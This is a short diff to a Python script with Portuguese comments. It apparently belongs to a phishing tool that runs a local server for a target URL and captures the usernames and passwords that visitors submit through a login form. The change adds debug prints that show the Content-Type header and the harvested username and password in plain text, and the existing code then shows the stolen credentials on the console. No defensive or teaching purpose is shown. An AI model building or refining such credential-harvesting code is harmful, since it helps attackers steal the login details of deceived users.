@@ -327,10 +327,17 @@ def run_local_server(target_url, language):
             # Adicionar depuração para verificar os dados recebidos
             print("Received POST data:", post_data)
 
+            # Adicionar depuração para verificar o tipo de dados
+            print("Content-Type:", self.headers['Content-Type'])
+
             # Analisar os dados POST para extrair credenciais
             post_params = urllib.parse.parse_qs(post_data)
             username = post_params.get('username', [''])[0]
             password = post_params.get('password', [''])[0]
+
+            # Adicionar depuração para verificar os dados extraídos
+            print("Parsed username:", username)
+            print("Parsed password:", password)
 
             # Exibir credenciais no console
             if language == '1':
